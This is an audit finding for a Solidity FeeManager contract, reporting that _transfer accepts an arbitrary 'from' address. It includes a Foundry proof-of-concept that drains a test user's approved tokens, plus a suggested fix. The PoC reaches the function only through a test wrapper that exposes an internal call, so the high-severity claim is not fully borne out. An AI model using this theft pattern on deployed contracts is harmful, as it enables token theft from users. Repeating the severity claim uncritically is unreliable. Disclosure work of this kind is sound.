# [H-1] Arbitrary `from address` in `_transfer` function in `FeeManager.sol` allows unauthorized token transfers (Improper Access Control + Asset Loss)

## Summary
The `FeeManager::_transfer` function allows specifying an arbitrary from address when transferring tokens. This can lead to unauthorized token transfers, as anyone can transfer tokens from any address that has previously approved the FeeManager contract to spend their tokens.

## Vulnerability Detail
The vulnerability is a case of arbitrary `from` address in the `_transfer` function in `FeeManager.sol`. This vulnerability allows anyone who uses the `_transfer` function to get drained by a malicious attacker.

The function can be found here:
https://github.com/sherlock-audit/2024-04-titles/blob/main/wallflower-contract-v2/src/fees/FeeManager.sol?plain=1#L461

## Impact
Users who have approved the `FeeManager` contract to spend their tokens are at risk of having their tokens transferred without their consent. An attacker can exploit this vulnerability to steal tokens from these users, leading to asset loss. 

Anyone who uses the `_transfer` function from `FeeManager` will be able to have all their tokens drained by a malicious attacker.

## Code Snippet

Add the test below to `FeeManager.t.sol`:

Create a TestToken.sol and import it into `FeeManager.t.sol`:

TestToken.sol:
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10 ** decimals());
    }
}
```

```javascript 
// import TestToken.sol into FeeManager.t.sol
import "./TestToken.sol";
```

Add this code to `FeeManager.t.sol`:

```javascript
contract FeeManagerTest is Test {
    address alice;
    address bob;
    ExposedFeeManager public exposedFeeManager;
    
    function setUp() public {
        feeManager = new FeeManager(address(1), address(this), address(new MockSplitFactory()));
        exposedFeeManager =
            new ExposedFeeManager(address(1), address(this), address(new MockSplitFactory()));
    }
    
function test_BobCanStealAliceTokens() public {
        TestToken token = new TestToken("Test Token", "TEST");
        alice = makeAddr("alice");
        bob = makeAddr("bob");

        // Transfer tokens to Alice
        token.transfer(alice, 1000 * 10 ** token.decimals());

        // Alice approves the ExposedFeeManager contract to spend her tokens
        vm.prank(alice);
        token.approve(address(exposedFeeManager), type(uint256).max);

        // Bob steals Alice's tokens using the vulnerability in _transfer
        vm.prank(bob);
        uint256 stolenAmount = token.balanceOf(alice);
        exposedFeeManager.exposedTransfer(address(token), stolenAmount, alice, bob);

        // Assert that Alice's balance is now zero
        assertEq(token.balanceOf(alice), 0);

        // Assert that Bob now has the stolen tokens
        assertEq(token.balanceOf(bob), stolenAmount);
    }
}

contract ExposedFeeManager is FeeManager {
    constructor(address admin_, address protocolFeeReceiver_, address splitFactory_)
        FeeManager(admin_, protocolFeeReceiver_, splitFactory_)
    {}

    function exposedTransfer(address asset_, uint256 amount_, address from_, address to_)
        external
    {
        _transfer(asset_, amount_, from_, to_);
    }
}
```

In this test:

We create a test token and two addresses, alice and bob.
We transfer some tokens to alice.
alice approves the `ExposedFeeManager` contract to spend her tokens.
bob exploits the vulnerability by calling `exposedTransfer` on the `ExposedFeeManager` contract, specifying alice as the from address and himself as the recipient.
We assert that alice's token balance is now zero and bob has the stolen tokens.

Run this test with ` forge test --mt test_BobCanStealAliceTokens`

## Recommendation

To fix this vulnerability, the `_transfer` function should be modified to ensure that the from address is always the caller of the function (msg.sender). Remove the `from_` parameter and replace it with `msg.sender` in the function body.

```javascript 
function _transfer(address asset_, uint256 amount_, address to_) internal {
    if (asset_ == ETH_ADDRESS) {
        to_.safeTransferETH(amount_);
    } else {
        asset_.safeTransferFrom(msg.sender, to_, amount_);
    }
}
```
By making this change, only the actual caller of the function can transfer their own tokens, preventing unauthorized token transfers.
